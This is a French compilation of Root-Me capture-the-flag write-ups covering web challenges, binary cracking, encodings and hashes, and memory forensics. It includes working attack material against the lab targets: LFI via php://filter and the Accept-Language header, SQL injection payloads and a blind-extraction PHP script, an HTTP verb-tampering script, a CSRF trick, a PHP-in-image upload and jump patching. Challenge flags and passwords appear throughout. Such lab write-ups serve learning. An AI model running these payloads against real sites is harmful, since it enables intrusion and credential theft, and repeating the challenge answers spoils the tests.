 __ __ __   ______     ________  _________  ______             __  __   ______     ______    ______   ______   _________         ___ __ __   ______         ______   ______    _______    
/_//_//_/\ /_____/\   /_______/\/________/\/_____/\           /_/\/_/\ /_____/\   /_____/\  /_____/\ /_____/\ /________/\       /__//_//_/\ /_____/\       /_____/\ /_____/\  /______/\   
\:\\:\\:\ \\:::_ \ \  \__.::._\/\__.::.__\/\::::_\/_   _______\:\ \:\ \\:::_ \ \  \:::_ \ \ \:::_ \ \\:::_ \ \\__.::.__\/_______\::\| \| \ \\::::_\/_      \:::_ \ \\:::_ \ \ \::::__\/__ 
 \:\\:\\:\ \\:(_) ) )_   \::\ \    \::\ \   \:\/___/\ /______/\\:\ \:\ \\:(_) \ \  \:(_) ) )_\:\ \ \ \\:\ \ \ \  \::\ \ /______/\\:.      \ \\:\/___/\   ___\:\ \ \ \\:(_) ) )_\:\ /____/\
  \:\\:\\:\ \\: __ `\ \  _\::\ \__  \::\ \   \::___\/_\__::::\/ \:\ \:\ \\: ___\/   \: __ `\ \\:\ \ \ \\:\ \ \ \  \::\ \\__::::\/ \:.\-/\  \ \\::___\/_ /__/\\:\ \ \ \\: __ `\ \\:\\_  _\/
   \:\\:\\:\ \\ \ `\ \ \/__\::\__/\  \::\ \   \:\____/\          \:\_\:\ \\ \ \      \ \ `\ \ \\:\_\ \ \\:\_\ \ \  \::\ \          \. \  \  \ \\:\____/\\::\ \\:\_\ \ \\ \ `\ \ \\:\_\ \ \
    \_______\/ \_\/ \_\/\________\/   \__\/    \_____\/           \_____\/ \_\/       \_\/ \_\/ \_____\/ \_____\/   \__\/           \__\/ \__\/ \_____\/ \:_\/ \_____\/ \_\/ \_\/ \_____\/
            
            
By mesrine_29
#########
REALISTE
==
#########

##Eh oui, parfois
Tout d’abord, il suffit de trouver la page admin (/admin). Ensuite, avec curl sous Linux, nous pouvons utiliser la requête ’OPTIONS’ qui n’est pas filtrée :

curl --request OPTIONS http://challenge01.root-me.org/realiste/ch3/admin/

-Le résultat :
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
   <title>Admin section</title>
</head>
<body>
   <h1>Mot de passe / password : 0_________1</h1>
</body>
</html>

On convertit bin2ascii et voilà

##P0wn3d
Nous sommes face à un logiciel connu : CMSimple, on a la source du logiciel qui est disponible publiquement. A ce propos, mon amis google me dit qu’il y a une faille LFI sur les fichiers de langage que l’on peut accéder via :
index.php?sl=xxx

Une erreur PHP est alors affichée dans la page retournée :
Language file ./cmsimple/languages/xxx.php missing

On voit que le script rajoute un chemin avant notre variable et l’extension .php après. Le chemin en préfixe nous empêche d’utiliser des filtres PHP qui nous aurait permis de récupérer le code source PHP. Il va donc falloir que l’on se débrouille avec les scripts déjà en place.

En fouillant dans les sources on remarque la présence d’un script adm.php qui sert notamment à la gestion de la configuration. Ce fichier n’est pas accessible directement :

    if (eregi('adm.php', sv('PHP_SELF')))die('Access Denied');

En utilisant notre LFI, cela ne pose pas de problème. Plus bas on trouve une section relative a la gestion de la configuration, et en particulier une action qui sert a télécharger le fichier de configuration. on regarde les variables nécessaires pour aller jusqu’à cette fonctionnalité :

- adm = pour etre authentifié
-  ile = config - > va indiquer que l’on veux traiter le fichier de config
-  action = download - > pour demander de telecharger ce fichier

ce qui nous donne la requête
index.php ?sl=../adm&file=config&action=download&adm=1

une fois le fichier téléchargé, il ne reste plus qu’a l’ouvrir pour récupérer notre précieux mot de passe.	

##The h@ckers l4b
Dans les news, le site parle d’un "systeme de journalisation d’événements pour l’admin".

Après un peu (ou beaucoup) de tentatives au hasard, on trouve le dossier /log/

http://challenge01.root- me.org/realiste/ch7/log/

Celui- ci possède un fichier nommé "log.php" protégé par un .htpasswd.
Dans les ressources liées au challenge on nous parle alors de HTTP verb tampering.

- Pour ça, rien de plus simple, création d’un petit script PHP qu’on exécute :

    	header('Content- type:text/plain');
    	$cookie = "spip_session=...; Session=..."; // A compléter.
    	$host   = "challenge01.root- me.org";
    	$path   = "/realiste/ch7/log/log.php";
     
    	$fp = fsockopen($host, 80, $errno, $errstr, 1);
    	fwrite($fp, "HAPPY {$path} HTTP/1.1\r\n");
    	fwrite($fp, "Host: {$host}\r\n");
    	fwrite($fp, "Cookie: {$cookie}\r\n");
    	fwrite($fp, "Connection: close\r\n");
    	fwrite($fp, "\r\n");
     
    	echo stream_get_contents($fp);
    	fclose($fp);
    	
- Le résultat retourné est :

 ----------------------- Log ---------------------
   login=toto / password=titi / no such user
   login=toto / password=toto / no such user
   login=toto / password=tutu / no such user
   login=administrateur / password=4Dm1N_de_ste / Password rejected for administrateur
   login=administrateur / password=4Dm1N_de_site / Accepted password for administrateur
   --------------------------------------------------
   
Bravo, nous venons de trouver notre identifiant et mot de passe administrateur, mais pas si vite, n’allez pas valider l’épreuve si rapidement. 
Il nous est demandé non pas le mot de passe de l’admin mais d’avoir accès aux exploits.

Tentons de nous connecter sur le compte administrateur, et là c’est le drame :
Erreur : user already logged in !

Pour mieux nous rendre compte de la situation, nous allons nous créer un compte et accéder à la page :
http://challenge01.root-me.org/realiste/ch7/hackers.php?page=membre

Celle-ci indique bien que l’administrateur est connecté.
Nous allons donc forger une attaque CSRF à partir du formulaire de contact pour le déconnecter.
Celui-ci semble accepter les BBCodes [img], parfait !

On fait un clique droit sur "déconnexion" et on sauvegarde le lien, qu’on replace dans le formulaire avec le bbcode image avant d’envoyer :
[img]hackers.php ?page=deconnect[/img]

Lorsque celui-ci lira son message, il sera automatiquement déconnecté.

Retournons sur la page qui liste les membres en ligne :
http://challenge01.root-me.org/realiste/ch7/hackers.php?page=membre

Magique, l’administrateur semble déconnecté.
Nous pouvons maintenant nous connecter sur son compte avec les identifiants préalablement récupéré dans le fichier log et accéder à la 
pages exploits afin de récupérer le flag et enfin crier victoire.   

##Néonazi à l’intérieur
On commence par fouiller les répertoires et fichiers possibles, on trouve un fichier de sauvegarde oublié : login.php  ou login.php.old . 
Il contient le code php du formulaire qui contrôle les autorisations de connexions au site.

- On regarde les variables POST transmises par le formulaire ($dec sert à la déconnexion), un couple username / password. 
    $login2=htmlentities($_POST["login"]);
    $pass2=$_POST["pass2"];
    $dec=$_POST["dec"];   	

- Plus bas on voit qu’un cookie galerie est crée et qu’il contient un login et le password encodé en Base64. 

    if (isset($dec) && $dec!="") {
    	$pass2="";
    	$login2="";
    	SetCookie("galerie");
    }
    ...
    if (isset($login2) && !empty($login2)) {	
    	$formatMysql="ymd";
    	$dateMysql=date($formatMysql);				
    	if (isset($pass2) && !empty($pass2))
    	    SetCookie("galerie", $login2.":".base64_encode($pass2));
    }
     Plus bas encore on découvre une partie de code intéressante qui vérifie le contenu des variables et qui nous offre même 
     le mot de passe chiffré en base64.
    - login2 doit être présent et non nul
    - pass2 doit être égal à YXplcnR5NjU0JiY=
    else if (isset($login2) && !empty($login2)) {	
    	if (base64_encode($pass2) == "YXplcnR5NjU0JiY=") {
    		echo "<center><font color=red><h2>Bienvennue $login2</h2><br><br></font>Redirection en cours...<center>";
    			echo '<script language="javascript" type="text/javascript">
    			window.location.replace("index.php3");
    			</script>';
    	} else {
    		echo '<center><font color="red">login/mot de passe incorrect<br><br></font></center>';
    	}
Ici le code source ne vérifie ni le contenu exact du nom d’utilisateur, et nous offre la valeur du password chiffré en base64 ( azerty654&& une fois décodé ).

En observant la requête avec BurpSuite, on voit bien le Cookie : galerie= en attente de paramètres à transmettre.

GET /realiste/ch1/head.php HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: galerie=
Connection: keep-alive
 
- Pour bypasser l’authentification nous avons donc seulement besoin que d’un nom bidon et du base64 YXplcnR5NjU0JiY=.
- Donnons lui ce qu’il attends et transmettons la requête au serveur.

Cookie: galerie=Abracadabra:YXplcnR5NjU0JiY=

Quelle que soit la page sur laquelle on se trouve on est gratifié d’un message de bienvenue avec le flag, dans le fichier inclus sur la gauche. :-)

    Bienvenue Abracadabra
    ...
    Bien joue !!!
    Le mot de passe est : 4[...]3
##PyRat Enchères
http://..../ch2/index.php?page=test->http://challenge.root-me.org//realiste/ch2/index.php?page=test
On se retrouve avec le message d’erreur suivant : Warning : include(test.inc.php) : failed to open stream:...

http://.../ch2/index.php?page=config.php%00->http://challenge.root-me.org//realiste/ch2/index.php?page=config.php%00
On se retrouve avec aucun message d’erreur. Le fichier config.php existe donc bien.
Un certain a été pris afin de trouvé ce fichier.

http://.../ch2/index.php?page=http://->http://challenge.root-me.org//realiste/ch2/index.php?page=http://
On regarde si le wrapper http est activé. La page retournée contient le message d’erreur suivant : 
http:// wrapper is disabled in the server configuration b.... Le wrapper http n’est donc pas activé.

http://.../ch2/index.php?page=php://->http://challenge.root-me.org//realiste/ch2/index.php?page=php://
On regarde si le wrapper php est activé. La page retournée contient le message d’erreur suivant : 
Warning : include() : Invalid php :// URL specified in /var.... Le wrapper php est bien activé. Il suffit maintenant d’exploiter.

http://.../ch2/index.php?page=php://filter/convert.base64-encode/resource=config.php%00->http://challenge01.root-me.org//realiste/ch2/index.php?page=php://filter/convert.base64-encode/resource=config.php%00

On récupère en base 64 le contenu de la page config.php. Contenu retourné : PD9waHANCiRob3RlID0gImxvY2Fs.. 
qu’il ne nous reste plus qu’à décoder pour voir le mot de passe recherché.

##Root-We
- Solution 1
- Ce que l’on sait avant de commencer :
- Grâce aux ressources associées, on sait qu’il s’agit de LFI,
- Grâce aux messages sur le site Root-We, on sait que la langue est détectée automatiquement,
- Habitué aux épreuves de root-me.org, on sait que la base de donnée est probablement pas très loin. :o)

- Ce que l’on teste et qui foire :
- La langue n’est pas détectée par la présence d’un cookie,
- Le paramètre "action" ne semble pas sensible aux LFI,
- Le formulaire de login ne semble pas sensible aux LFI/Injections SQL,

- Ce que l’on teste et qui foire pas trop :
On arrive à déterminer où se trouve la vulnérabilité : Le champ Accept-Language du header HTTP. En générant quelques Warning php, on apprend qu’il s’agit d’une vulnérabilité de type include().

Ce que l’on sait à propos de cette vulnérabilité :
- On peut inclure n’importe quel type de fichier
- Si on inclue du code php, il sera interprété par le serveur
- Il est possible de wrapper le fichier (http://php.net/manual/en/wrappers.php)

- Ce que l’on trouve :
- php ://fd/1 => Le wrapper php est autorisé et il est possible d’inclure un fichier en utilisant le descripteur de fichier.
- php ://fd/18 => Nous renvoie la base de donnée SQLite ! (Win \o/)

SQLite format 3
[...]
admin704b037a97fa9b25522b7c014c300f8a
[...]
-Solution 2
Par rapport aux autres solutions, rien de bien innovant à part le fait de le résoudre avec CURL ;-)

Une news est importante sur le site sur la détection du language.
En faisant, un test avec un plugin sous Firefox (live http headers) : j’obtiens alors :
Accept-Language: en-US,en;q=0.5
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3

Par ailleurs, en faisant un simple test comme la détection de fichier de config , j’obtiens une page blanche
http://challenge01.root-me.org/realiste/ch4/config.php

Alors je test avec CURL :
curl --header "Accept-Language: php://filter/read=convert.base64-encode/resource=config.php"  http://challenge01.root-me.org/realiste/ch4/index.php

Les options à CURL sont (—header) pour lui inclure l’header "Accept-Language".

Résultat :
PD9waHANCiRkYXRhYmFzZV9maWxlPSJkYjRyZWFsaXN0ZS5zcWxpdGUiOw0KJGRhdGFiYXNlPSIiOw0KDQoNCmZ1bmN0aW9uIGNyZWF0ZURCKCl7DQogICAgZ2xvYmFsICRkYXRhYmFzZV9maWxlOw0KICAgIGdsb2JhbCAkZGF0YWJhc2U7DQogICAgdHJ5IHsNCiAgICAgIC8vY3JlYXRlIG9yIG9wZW4gdGhlIGRhdGFiYXNlDQoJJGRhdGFiYXNlID0gbmV3IFNRTGl0ZTMoJGRhdGFiYXNlX2ZpbGUpOw0KICAgIH0NCiAgICBjYXRjaChFeGNlcHRpb24gJGUpew0KICAgICAgZGllKCRlKTsNCiAgICB9DQovKg0KICAgICRxdWVyeSA9ICdEUk9QIFRBQkxFIHVzZXJzJzsNCiAgICAkZGF0YWJhc2UtPmV4ZWMoJHF1ZXJ5KTsgICAgIA0KICAgICRxdWVyeSA9ICdDUkVBVEUgVEFCTEUgdXNlcnMgJyAuDQoJICAgICcodXNlcm5hbWUgVEVYVCwgcGFzc3dvcmQgVEVYVCwgWWVhciBJTlRFR0VSKSc7DQogICAgJGRhdGFiYXNlLT5leGVjKCRxdWVyeSk7ICAgDQoJICANCiAgICAkcXVlcnkgPSANCiAgICAgICdJTlNFUlQgSU5UTyB1c2VycyAodXNlcm5hbWUsIHBhc3N3b3JkLCBZRUFSKSAnIC4NCiAgICAgICdWQUxVRVMgKCJhZG1pbiIsICJkZWZhdWx0X3Bhc3N3b3JkIiwgMjAxMSknOw0KDQogICAkZGF0YWJhc2UtPmV4ZWMoJHF1ZXJ5KTsqLw0KDQp9DQoNCg0KDQo/Pg==

C’est du base64 qui décodé donne :

    <?php
    $database_file="db4realiste.sqlite";
    $database="";
     
     
    function createDB(){
        global $database_file;
        global $database;
        try {
          //create or open the database
    	$database = new SQLite3($database_file);
        }
        catch(Exception $e){
          die($e);
        }
    /*
        $query = 'DROP TABLE users';
        $database->exec($query);     
        $query = 'CREATE TABLE users ' .
    	    '(username TEXT, password TEXT, Year INTEGER)';
        $database->exec($query);   
     
        $query = 
          'INSERT INTO users (username, password, YEAR) ' .
          'VALUES ("admin", "default_password", 2011)';
     
       $database->exec($query);*/
     
    }


Le regarder avec un code couleur, sinon on ne voit pas le commentaire et la notion d’admin et default_password nous induit en erreur o:)
On voit que la base de donnée est db4realiste.sqlite.
On recommence avec CURL mais sans wrapper puisque ce n’est pas du PHP :

curl --header "Accept-Language: db4realiste.sqlite"  http://challenge01.root-me.org/realiste/ch4/index.php

J’obtiens alors :
SQLite format
[...junk...]
admin704b037a97fa9b25522b7c014c300f8a

donc je vois bien admin et 704b037a97fa9b25522b7c014c300f8a
Je me dis que ce dernier ressemble fortement à du MD5 et puisque dans les ressources il est fait mention de collision MD5, je me dit alors pourquoi pas .
Après un site de md5decode, j’obtiens alors :

MD5 (704b037a97fa9b25522b7c014c300f8a) = 4dm1n

Je me loggue sur la page de login avec admin / 4dm1n et j’obtiens alors :
Welcome back admin !

Utilisez ce mot de passe pour valider le challenge       	        
  
##MALab
- Solution 1 
Une fois inscrit et loggué, on observe une chose :

Le cookie Session a été créé avec une valeur en base64, une fois decodé on voit un id et notre mot de passe utilisé lors de l’inscription en md5.
Cette id correspond à notre id dans la page member. Donc on va tenter d’utiliser l’id de l’admin à la place du notre et faire une SQLi classique :

1’ or 1=’1
en base64 : MScgb3IgMT0nMQ==

Avec firebug on edite le cookie Session et on le remplace par notre SQLi en base64.

On clique sur "Home", bingo on est admin et nous avons accès à la page upload.

Le reste de l’attaque est l’upload d’un fichier forgé :

lo.php.jpg
<?php phpinfo() ?> 

Bonus , script de récupération du hash md5 de l’admin via le cookie :

    <?php
    $spip_session=""
    $phpsessid=""
    $res = "";
    $tab = array( "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "97", "98", "99", "100", "101", "102" );
    for ($o= 1; $o <33; $o++){
    	for ($i=0; $i < 16; $i++){
     
    		$char = chr($tab[$i]);
    		$sqli="1' and pass LIKE \"".$res.$char."%\" or 1='1";
     
    		$code = base64_encode($sqli);
     
    		$url = "http://challenge01.root-me.org//realiste/ch8/index.php?id=6";
    		$ch = curl_init("$url");
    		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    		curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$phpsessid; spip_session=$spip_session; Session=$code");
    		$result = curl_exec( $ch );
    		curl_close($ch);
     
    		if(preg_match("/Welcome admin/i",$result,$out)){
    			$res .= chr($tab[$i]);
    			echo $o." : ".$res."\n";
    			break;
    		}
    	}
    }
     
    ?>
0d63031864eaeeab8baf66bee4e9c3b9:default_password
    
- Solution 2
C’est toujours un plaisir de faire plaisir à notre gouvernement, allons flanquer une dérouillée à ce laboratoire américain.

Rien d’intéressant à première vu, allons nous créer un compte pour en apprendre d’avantage.

Première chose qu’on découvre une fois connecté : une section d’upload accessible uniquement par les administrateurs. Au vu de notre mission, 
ce que l’on re-cherche doit sûrement se trouver par là, bref à nous de récupérer un compte avec des droits suffisants pour accéder à cette rubrique.

Nous allons nous intéresser à la partie "Members" qui recense les différents membres, avec tous des noms plus exotiques les uns que les autres.

Et miracle, il semble y avoir une injection SQL possible sur cette page :
http://challenge01.root-me.org/realiste/ch8/?id=6&action=view&uid=-1+or+1=1

Après quelques tentatives vous trouverez surement :
http://challenge01.root-me.org/realiste/ch8/?id=6&action=view&uid=-1+UNION+ALL+SELECT+1,2,3

Qui vous affichera le chiffre "1", et vous en déduirez :
http://challenge01.root-me.org/realiste/ch8/?id=6&action=view&uid=-1+UNION+ALL+SELECT+pass,2,3+FROM+users

Malgré que le site nous informe qu’il a détecté un hack, ce n’est pas pour autant qu’il semble vouloir le bloquer. 
Nous récupérons donc notre hash du mot de passe admin : 0d63031864eaeeab8baf66bee4e9c3b9.

Un petit coup dans Google nous indiquera que 0d63031864eaeeab8baf66bee4e9c3b9 est le MD5 de default_password .

Nous pouvons donc dès à présent nous déconnecter pour nous connecter au compte admin (ID:admin, pass:default_password), 
et accéder à la rubrique qui nous intéresse : l’Upload.

L’upload est gérré assez bizarrement,
Pour pouvoir valider l’épreuve il faut :

    Un fichier nommé par exemple : banner.php.jpg
    Que le mime-type envoyé en header corresponde bien au fichier (image/jpg dans ce cas)
    Modifier la valeur de MAX_FILE_SIZE envoyé dans le header soit égale ou supérieure à 100000
    Contenir un petit code php dans l’image (ouvrez l’image avec un éditeur de texte et insérérez un
    <?php ?>
    quelque part).

Une fois ce fichier envoyé, si tous les paramètres sont corrects, il vous affichera un joli :

    uploading /tmp/phpxxxxx to upload/banner.php.jpg
    Checking "/tmp/phpxxxxx" content...
    File is accessible there : banner.php.jpg

Et en vous rendant sur le lien, un message vous attendra avec le flag pour valider cette épreuve.   
######### 
CRACKING
==
#########

##ELF - 0 protections    
Il suffit d’exécuter le programme avec ltrace (permet de voir les appels à des fonctions de bibliothèques externes faits par le programme) en tapant un mot de basse bidon :
$ ltrace ./ch1.bin

Dans la sortie de ltrace, on peut remarquer un appel à strcmp :
strcmp("tentative_random", "123456789")
On se doute alors que l’entrée de l’utilisateur ("tentative_random") est comparée avec 
le vrai mot de passe ("123456789"), que l’on peut donc rentrer pour valider l’épreuve. 

##ELF - Basique
-Solution 1
utiliser la commande objdump -d ch2.bin > fichier.txt pour désassembler le programme .
On repère dans main :

8048373 : e8 78 7f 00 00 call 80502f0
8048378 : 85 c0 test %eax,%eax
804837a : 75 54 jne 80483d0
804837c : c7 04 24 f5 6b 0a 08 movl $0x80a6bf5,(%esp)
8048383 : e8 28 0a 00 00 call 8048db0 <_IO_printf>
8048388 : 8b 45 f8 mov -0x8(%ebp),%eax
804838b : 89 04 24 mov %eax,(%esp)
804838e : e8 d7 fe ff ff call 804826a
8048393 : 89 45 f8 mov %eax,-0x8(%ebp)
8048396 : 8b 45 f0 mov -0x10(%ebp),%eax
8048399 : 89 44 24 04 mov %eax,0x4(%esp)
804839d : 8b 45 f8 mov -0x8(%ebp),%eax
80483a0 : 89 04 24 mov %eax,(%esp)
80483a3 : e8 48 7f 00 00 call 80502f0
80483a8 : 85 c0 test %eax,%eax
80483aa : 75 16 jne 80483c2

On peut se douter que ces lignes en gras vérifie username puis password.

La fonction strcmp en c compare deux chaînes de caractère et renvoie la valeur 0 si ces deux chaîne sont identiques ,
le résultat est récupéré dans le registre eax qui est ensuite comparé a 0 (test eax,eax).

=> Ouvrir le fichier ch2.bin avec la commande hexedit et remplacer les deux sauts 75 (code hexadécimal de jne )par 74 (code hexadécimal de je ) .

Et voila le code d’identification est "neutralisé" ,le programme accepte n’importe quel nom d’utilisateur et mot de passe
-Solution 2
Modification du fils d’exécution depuis gdb

> gdb ch12.bin
gdb > b main
gdb > disas main

on repérer les adresses des sauts conditionnels
0x0804837a <+113> : jne 0x80483d0
..........................
0x080483aa <+161> : jne 0x80483c2

on remplace le jne (0x75) par je(0x74)
gdb > set {short}0x0804837a = 0x74
gdb > set {short}0x080483aa = 0x74

on reprend l’execution :
gdb> n

username : fdsdf
password : dfsdf
Bien joue, vous pouvez valider l’epreuve avec le mot de passe : 9....	 

##PE - 0 protections
- Voici le code :


    00401700  /$ 55             PUSH EBP
    00401701  |. 89E5           MOV EBP,ESP
    00401703  |. 83EC 18        SUB ESP,18
    00401706  |. B8 44404000    MOV EAX,ch15.00404044                    ; ||ASCII "Usage: %s pass"
    0040170B  |. 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]             ; ||
    0040170E  |. 895424 04      MOV DWORD PTR SS:[ESP+4],EDX             ; ||
    00401712  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; ||
    00401715  |. E8 96110000    CALL <JMP.&msvcrt.printf>                ; |\printf
    0040171A  |. C70424 0000000>MOV DWORD PTR SS:[ESP],0                 ; |
    00401721  |. E8 7A110000    CALL <JMP.&msvcrt.exit>                  ; \exit
    00401726  |$ 55             PUSH EBP
    00401727  |. 89E5           MOV EBP,ESP
    00401729  |. 83EC 28        SUB ESP,28
    0040172C  |. C745 F4 000000>MOV DWORD PTR SS:[EBP-C],0               ; ||
    00401733  |. 837D 0C 07     CMP DWORD PTR SS:[EBP+C],7               ; ||
    00401737  |. 75 71          JNZ SHORT ch15.004017AA                  ; ||
    00401739  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    0040173C  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    0040173F  |. 3C 53          CMP AL,53                                ; ||
    00401741  |. 75 67          JNZ SHORT ch15.004017AA                  ; ||
    00401743  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    00401746  |. 83C0 01        ADD EAX,1                                ; ||
    00401749  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    0040174C  |. 3C 50          CMP AL,50                                ; ||
    0040174E  |. 75 5A          JNZ SHORT ch15.004017AA                  ; ||
    00401750  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    00401753  |. 83C0 02        ADD EAX,2                                ; ||
    00401756  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    00401759  |. 3C 61          CMP AL,61                                ; ||
    0040175B  |. 75 4D          JNZ SHORT ch15.004017AA                  ; ||
    0040175D  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    00401760  |. 83C0 03        ADD EAX,3                                ; ||
    00401763  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    00401766  |. 3C 43          CMP AL,43                                ; ||
    00401768  |. 75 40          JNZ SHORT ch15.004017AA                  ; ||
    0040176A  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    0040176D  |. 83C0 04        ADD EAX,4                                ; ||
    00401770  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    00401773  |. 3C 49          CMP AL,49                                ; ||
    00401775  |. 75 33          JNZ SHORT ch15.004017AA                  ; ||
    00401777  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    0040177A  |. 83C0 05        ADD EAX,5                                ; ||
    0040177D  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    00401780  |. 3C 6F          CMP AL,6F                                ; ||
    00401782  |. 75 26          JNZ SHORT ch15.004017AA                  ; ||
    00401784  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    00401787  |. 83C0 06        ADD EAX,6                                ; ||
    0040178A  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    0040178D  |. 3C 53          CMP AL,53                                ; ||
    0040178F  |. 75 19          JNZ SHORT ch15.004017AA                  ; ||
    00401791  |. B8 53404000    MOV EAX,ch15.00404053                    ; ||ASCII "Gratz man :)"
    00401796  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; ||
    00401799  |. E8 12110000    CALL <JMP.&msvcrt.printf>                ; |\printf
    0040179E  |. C70424 0000000>MOV DWORD PTR SS:[ESP],0                 ; |
    004017A5  |. E8 F6100000    CALL <JMP.&msvcrt.exit>                  ; \exit
    004017AA  |> C70424 6040400>MOV DWORD PTR SS:[ESP],ch15.00404060     ; |ASCII "Wrong password"
    004017B1  |. E8 02110000    CALL <JMP.&msvcrt.puts>                  ; \puts
    004017B6  |. C9             LEAVE
    004017B7  \. C3             RETN
    
-Tout d’abord on peut voir que le mot de passe doit être passé en paramètre au programme :

    00401700  /$ 55             PUSH EBP
    00401701  |. 89E5           MOV EBP,ESP
    00401703  |. 83EC 18        SUB ESP,18
    00401706  |. B8 44404000    MOV EAX,ch15.00404044                    ; ||ASCII "Usage: %s pass"
    0040170B  |. 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]             ; ||
    0040170E  |. 895424 04      MOV DWORD PTR SS:[ESP+4],EDX             ; ||
    00401712  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; ||
    00401715  |. E8 96110000    CALL <JMP.&msvcrt.printf>                ; |\printf
    0040171A  |. C70424 0000000>MOV DWORD PTR SS:[ESP],0                 ; |
    00401721  |. E8 7A110000    CALL <JMP.&msvcrt.exit>                  ; \exit

- Si aucun argument n’est passé au programme celui ci affichera son message d’erreur et se fermera (instantanément), 
aucune pause avant la fermeture du programme n’est effectuée, ce qui explique l’ouverture et fermeture instantanée du programme quand on double 
clique dessus.

- Quand un mot de passe est entré, on peut voir que le programme va comparer sa longueur à 7, et jump sur le message d’erreur si les valeurs ne match pas .

    00401733  |. 837D 0C 07     CMP DWORD PTR SS:[EBP+C],7               ; ||
    00401737  |. 75 71          JNZ SHORT ch15.004017AA                  ; ||

- Si la condition est respectée, le programme va continuer et comparer un à uns les caractères composant le passwd entré, 
	aux caractères du password de validation , en jumpant sur le message
d’erreur dès que deux caractères sont différents .

Voici la séquence de comparaison du premier caractère, à 0040173F , le programme va comparer le premier caractère du 
password que vous avez entré(contenu dans AL), au premier caractère du vrai password représenté en hexa => 0x53 (soit ’S’ en ascii).

    00401739  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; ||
    0040173C  |. 0FB600         MOVZX EAX,BYTE PTR DS:[EAX]              ; ||
    0040173F  |. 3C 53          CMP AL,53                                ; ||
    00401741  |. 75 67          JNZ SHORT ch15.004017AA                  ; ||
        
- Et ainsi de suite pour chaque caractères de 00401739 à 0040178F suivi par le message de réussite puis celui d’echec.

- Les valeurs ascii comparées sont : 0x53 0x50 0x61 0x43 0x49 0x6f 0x53

flag : SPaCIoS

#########
Cryptanalyse
==
#########

##Encodage - ASCII
Une fois remarqué que cette chaine est en l’hexadécimal, il est assez facile de la décoder en Python :
str = "4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465"
     
str.decode("hex")

##Encodage - UU
(Réalisé sous GNU/Linux)
Le titre du challenge permet de deviner que le fichier est codé en "UUencode".
Copier/coller le contenu du challenge dans un fichier texte (code.txt, par exemple) et utiliser uudecode pour le déchiffrer.
Voici la commande à utiliser :

uudecode -o code_en_clair.txt code.txt

La commande va créer un fichier "code_en_clair.txt". Il suffit ensuite de le lire pour voir apparaître le résultat du challenge :
Very simple ;)
PASS = ULTRASIMPLE

- Complément d’information :
Si vous n’avez pas uuencode/uudecode d’installés, il faut installer le paquet sharutils.
sudo apt-get install sharutils

Flag : ULTRASIMPLE

##Hash - Message Digest 5
Ce condensat au format MD5 se casse en 3 secondes avec john the ripper :
041-Portable tmp # cat hash.txt
admin:7ecc19e1a0be36ba2c6f05d06b5d3058

041-Portable tmp # john --format=raw-MD5 hash.txt
Loaded 1 password hash (Raw MD5 [raw-md5 64x1])
weak             (admin)

##Hash - SHA2
L’indice donné par le challenge dit que c’est du SHA-2. Il y a plusieurs types de SHA-2 qui diffèrent par la taille du mot choisi.
La taille du hash fait 65 caractères, c’est déjà louche.
D’ailleurs en lançant john pour cracker le hash, pas de résultat.
Il faut en fait enlever le ’k’ qui ne rentre pas dans les caractères hexadécimaux.
En cherchant directement le hash sur le net, on trouve le mot de passe correspondant.

Pour générer le sha1, petite astuce à connaître :
echo -n "4dM1n" | sha1sum
En effet, echo génère un saut de ligne, donc pour avoir un hash correct, il faut le retirer.

#########
FORENSIC
==
#########

##Command & Control - niveau 2
Solution 1
Une autre solution utilisant volatility mais ne necessitant pas de chercher dans la base de registre :

- On determine le type d’image

    >volatility-2.1.standalone.exe -f ch2.dmp imageinfo

et ensuite on utilise envars qui affiche les variables d’environnement (utilisateur, path...).
Pour info, ce plugin n’est disponible que dans les toutes dernieres versions de volatility (> 2.0).

    >volatility-2.1.standalone.exe --profile=Win7SP0x86 -f ch2.dmp envars

et on obtient COMPUTERNAME WIN-ETSA91RKCFP
Solution 2
Souvenons-nous que les variables d’environnement sont chargées par les processus présents en mémoire...
Un petit tour sur wikipedia (http://en.wikipedia.org/wiki/Environment_variable) ou dans un invité de commande Windows permet 
d’obtenir une liste de ces variables d’environnement :
C:\Users\mafuba>set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\mafuba\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=LEETCOMPUTER                        <-------------------
ComSpec=C:\Windows\system32\cmd.exe
...

